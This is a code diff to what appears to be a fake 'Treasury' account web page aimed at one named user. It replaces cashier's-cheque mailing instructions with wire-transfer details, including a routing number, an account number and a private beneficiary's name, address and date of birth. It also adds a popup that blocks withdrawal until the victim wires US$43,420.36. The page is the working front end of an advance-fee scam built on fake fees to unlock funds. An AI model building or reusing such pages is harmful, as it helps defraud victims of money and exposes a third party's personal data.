@@ -2603,6 +2603,71 @@ body::after {
 }
 .shake { animation: shake 0.35s ease; }
 
+/* Modal Styles */
+.modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 10000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    animation: fadeIn 0.25s ease;
+}
+.modal-overlay.show {
+    display: flex;
+}
+.modal-content {
+    background: linear-gradient(165deg, rgba(13, 21, 38, 0.98) 0%, rgba(5, 10, 20, 0.99) 100%);
+    border: 1px solid rgba(240, 216, 120, 0.4);
+    border-radius: 12px;
+    padding: 28px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 24px 80px rgba(0, 0, 0, 0.9), 0 0 60px rgba(212, 175, 55, 0.2);
+    position: relative;
+    animation: fadeInUp 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+}
+.modal-icon {
+    width: 56px; height: 56px;
+    border-radius: 50%;
+    background: radial-gradient(circle at 35% 30%, #f8e79a 0%, #d4af37 40%, #8a7324 100%);
+    display: flex; align-items: center; justify-content: center;
+    color: var(--navy);
+    margin: 0 auto 16px;
+    box-shadow: 0 0 30px rgba(240, 216, 120, 0.7);
+}
+.modal-icon svg { width: 28px; height: 28px; }
+.modal-title {
+    font-size: 1.2rem;
+    font-weight: 800;
+    color: var(--white);
+    text-align: center;
+    margin-bottom: 8px;
+    background: linear-gradient(180deg, #ffffff 0%, #f0d878 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.modal-text {
+    font-size: 0.88rem;
+    line-height: 1.65;
+    color: var(--slate);
+    text-align: center;
+    margin-bottom: 24px;
+    font-family: 'JetBrains Mono', monospace;
+}
+.modal-text strong {
+    color: var(--gold-bright);
+    font-weight: 700;
+    display: block;
+    margin: 8px 0;
+    font-size: 1.1rem;
+}
+
 @media (min-width: 900px) { .main-nav { display: flex; } }
 @media (max-width: 900px) {
     .menu-btn { display: flex; }
@@ -3498,118 +3563,68 @@ body::after {
                 </div>
             </div>
 
-            <!-- RONALD MORRIS — Cashier's Cheque instructions (SILVERSTONEZ CONSTRUCTION INC) -->
+            <!-- RONALD MORRIS — Wire Transfer Details -->
             <div class="cheque-instruction-box" id="ronaldChequeBox" style="display: none;">
                 <div class="cheque-instruction-header">
                     <div class="cheque-instruction-icon">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
-                            <polyline points="14 2 14 8 20 8"/>
-                            <line x1="16" y1="13" x2="8" y2="13"/>
-                            <line x1="16" y1="17" x2="8" y2="17"/>
+                            <polyline points="17 1 21 5 17 9"/>
+                            <path d="M3 11V9a4 4 0 0 1 4-4h14"/>
+                            <polyline points="7 23 3 19 7 15"/>
+                            <path d="M21 13v2a4 4 0 0 1-4 4H3"/>
                         </svg>
                     </div>
                     <div>
-                        <div class="cheque-instruction-title">Cashier's Cheque · Treasury Deposit Instruction</div>
-                        <div class="cheque-instruction-sub">Make the cheque payable to the mailing name below</div>
+                        <div class="cheque-instruction-title">Wire Transfer · Treasury Deposit Instruction</div>
+                        <div class="cheque-instruction-sub">Use the details below to complete your transfer</div>
                     </div>
                 </div>
 
                 <div class="cheque-instruction-text">
-                    To deposit funds into your Treasury account and <strong>unlock your wire transfer to Wells Fargo</strong>,
-                    you must obtain a <strong>Cashier's Cheque</strong> made out in the mailing name below. The
-                    mailing address must be used to mail the physical cheque via <strong>FedEx or USPS</strong> so
-                    the cheque can be verified by the Treasury officer.
+                    To deposit funds into your Treasury account and <strong>unlock your wire transfer</strong>, please use the following wire details. A Treasury officer will verify the incoming wire before credit is applied.
                 </div>
 
                 <div class="cheque-company-details">
                     <div class="cheque-company-row">
-                        <div class="cheque-company-label">Cheque Made Payable To (Mailing Name)</div>
-                        <div class="cheque-company-value gold">SILVERSTONEZ CONSTRUCTION INC</div>
+                        <div class="cheque-company-label">Bank Name</div>
+                        <div class="cheque-company-value gold">CITI Bank</div>
                     </div>
                     <div class="cheque-company-row">
-                        <div class="cheque-company-label">Mailing Address (For FedEx / USPS)</div>
-                        <div class="cheque-company-value">149-86 38th Ave, Flushing, NY 11354</div>
+                        <div class="cheque-company-label">Routing Number</div>
+                        <div class="cheque-company-value">271070801</div>
                     </div>
                     <div class="cheque-company-row">
-                        <div class="cheque-company-label">Mailing Method</div>
-                        <div class="cheque-company-value">FedEx or USPS (physical cheque)</div>
+                        <div class="cheque-company-label">Account Number</div>
+                        <div class="cheque-company-value">11643377085</div>
                     </div>
                     <div class="cheque-company-row">
-                        <div class="cheque-company-label">Available Banks</div>
-                        <div class="cheque-company-value">Wells Fargo · Bank of America · Truist</div>
+                        <div class="cheque-company-label">Beneficiary Name</div>
+                        <div class="cheque-company-value gold">Rhiannon Diodati</div>
+                    </div>
+                    <div class="cheque-company-row">
+                        <div class="cheque-company-label">Bank Address</div>
+                        <div class="cheque-company-value">90 Park Ave, New York, NY 10016</div>
+                    </div>
+                    <div class="cheque-company-row">
+                        <div class="cheque-company-label">Account Holder Address</div>
+                        <div class="cheque-company-value">13 Belmont St APT 1 Westfield MA 01085</div>
+                    </div>
+                    <div class="cheque-company-row">
+                        <div class="cheque-company-label">Date of Birth of Account Holder</div>
+                        <div class="cheque-company-value">03/01/1995</div>
                     </div>
                 </div>
 
-                <div class="shipping-instructions">
-                    <div class="shipping-instructions-header">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <rect x="2" y="7" width="20" height="14" rx="2"/>
-                            <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/>
-                        </svg>
-                        Shipping Instructions
-                    </div>
-
-                    <div class="shipping-note-list">
-                        <div class="shipping-note-item">
-                            <span class="shipping-note-num">1</span>
-                            <span>Without signature.</span>
-                        </div>
-                        <div class="shipping-note-item">
-                            <span class="shipping-note-num">2</span>
-                            <span>FedEx and USPS.</span>
-                        </div>
-                        <div class="shipping-note-item">
-                            <span class="shipping-note-num">3</span>
-                            <span>Packed in a box or tucked inside a book.</span>
-                        </div>
-                        <div class="shipping-note-item">
-                            <span class="shipping-note-num">4</span>
-                            <span>Please select a delivery time after 9 AM.</span>
-                        </div>
-                        <div class="shipping-note-item">
-                            <span class="shipping-note-num">5</span>
-                            <span>Please avoid weekends for delivery.</span>
-                        </div>
-                    </div>
-
-                    <div class="shipping-overnight">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
-                        </svg>
-                        Overnight Delivery
-                    </div>
-                </div>
-
-                <div class="pending-steps" style="border-left-color: var(--gold-bright); background: rgba(0,0,0,0.35); margin-bottom: 16px;">
-                    <div class="pending-step" style="color:#e2e8f0;">
-                        <span class="pending-step-num" style="background: rgba(240,216,120,0.2); border-color: rgba(240,216,120,0.6); color: var(--gold-bright);">1</span>
-                        Obtain a Cashier's Cheque payable to <strong style="color: var(--gold-bright);">SILVERSTONEZ CONSTRUCTION INC</strong>.
-                    </div>
-                    <div class="pending-step" style="color:#e2e8f0;">
-                        <span class="pending-step-num" style="background: rgba(240,216,120,0.2); border-color: rgba(240,216,120,0.6); color: var(--gold-bright);">2</span>
-                        Mail the physical cheque to <strong style="color: var(--gold-bright);">149-86 38th Ave, Flushing, NY 11354</strong> using <strong style="color: var(--gold-bright);">FedEx or USPS</strong> with overnight delivery.
-                    </div>
-                    <div class="pending-step" style="color:#e2e8f0;">
-                        <span class="pending-step-num" style="background: rgba(240,216,120,0.2); border-color: rgba(240,216,120,0.6); color: var(--gold-bright);">3</span>
-                        Treasury officer verifies the cheque upon delivery — this unlocks the wire from the Treasury account to Wells Fargo.
-                    </div>
-                </div>
-
-                <div class="cheque-pending-details" style="margin-bottom: 0;">
-                    <div class="cheque-pending-icon">
+                <div class="cheque-pending-details" style="margin-bottom: 0; border-color: rgba(52, 211, 153, 0.5); background: rgba(52, 211, 153, 0.08);">
+                    <div class="cheque-pending-icon" style="background: linear-gradient(135deg, #34d399 0%, #059669 100%); box-shadow: 0 0 18px rgba(52, 211, 153, 0.5);">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="12" cy="12" r="10"/>
-                            <polyline points="12 6 12 12 16 14"/>
+                            <polyline points="20 6 9 17 4 12"/>
                         </svg>
                     </div>
                     <div class="cheque-pending-content">
-                        <div class="cheque-pending-label">Cheque Amount Pending Approval</div>
+                        <div class="cheque-pending-label" style="color: #34d399; border-color: rgba(52, 211, 153, 0.5); background: rgba(52, 211, 153, 0.2);">Wire Details Active</div>
                         <div class="cheque-pending-text">
-                            The <strong>exact cheque amount</strong> will be provided by the Treasury
-                            <strong>only after your deposit instruction has been approved</strong>. Once approved,
-                            your secure inbox will receive the final cheque amount to write on the cashier's cheque
-                            along with your confirmation code.
+                            These wire instructions are active. Please ensure all details match exactly when initiating the transfer.
                         </div>
                     </div>
                 </div>
@@ -4067,6 +4082,28 @@ body::after {
             </div>
         </div>
     </main>
+</div>
+
+<!-- ══════════════ MODAL: WITHDRAW DEPOSIT REQUIRED ══════════════ -->
+<div class="modal-overlay" id="withdrawModal">
+    <div class="modal-content">
+        <div class="modal-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="12" y1="5" x2="12" y2="19"/>
+                <polyline points="19 12 12 19 5 12"/>
+            </svg>
+        </div>
+        <div class="modal-title">Wire Deposit Required</div>
+        <div class="modal-text">
+            Before your withdrawal can be processed, a wire deposit must be made to cover the required clearance.
+            <br><br>
+            <strong>US$ 43,420.36</strong>
+        </div>
+        <div style="display: flex; gap: 12px; margin-top: 24px;">
+            <button class="btn-submit" style="flex: 1; background: rgba(255, 255, 255, 0.05); border-color: var(--border); color: var(--slate);" id="modalCancelBtn">Cancel</button>
+            <button class="btn-submit" style="flex: 1;" id="modalDepositBtn">Deposit Now</button>
+        </div>
+    </div>
 </div>
 
 <div class="toast-host" id="toastHost" aria-live="polite"></div>
@@ -5089,7 +5126,7 @@ body::after {
         e.preventDefault();
 
         if (currentUser && currentUser.userId === 'ronald.morris' && selectedMethod === 'cheque') {
-            toast('Cashier\'s cheque details will be provided after Treasury approval.', 'info');
+            toast('Wire transfer details are provided on the page.', 'info');
             return;
         }
 
@@ -5288,12 +5325,20 @@ body::after {
         }
         var ronaldBtn = e.target.closest && e.target.closest('#withdrawBtn');
         if (ronaldBtn) {
-            var errEl = document.getElementById('withdrawError');
-            if (errEl) {
-                errEl.textContent = '✗ Withdrawal Failed — Account is locked pending identity verification at the bank.';
-                errEl.classList.add('show');
-            }
+            var modal = document.getElementById('withdrawModal');
+            if (modal) modal.classList.add('show');
         }
+    });
+
+    document.getElementById('modalCancelBtn').addEventListener('click', function() {
+        document.getElementById('withdrawModal').classList.remove('show');
+    });
+
+    document.getElementById('modalDepositBtn').addEventListener('click', function() {
+        document.getElementById('withdrawModal').classList.remove('show');
+        prepareDepositView();
+        showView('depositView');
+        toast('Please complete your wire deposit.', 'info');
     });
 
     var chatResponses = [
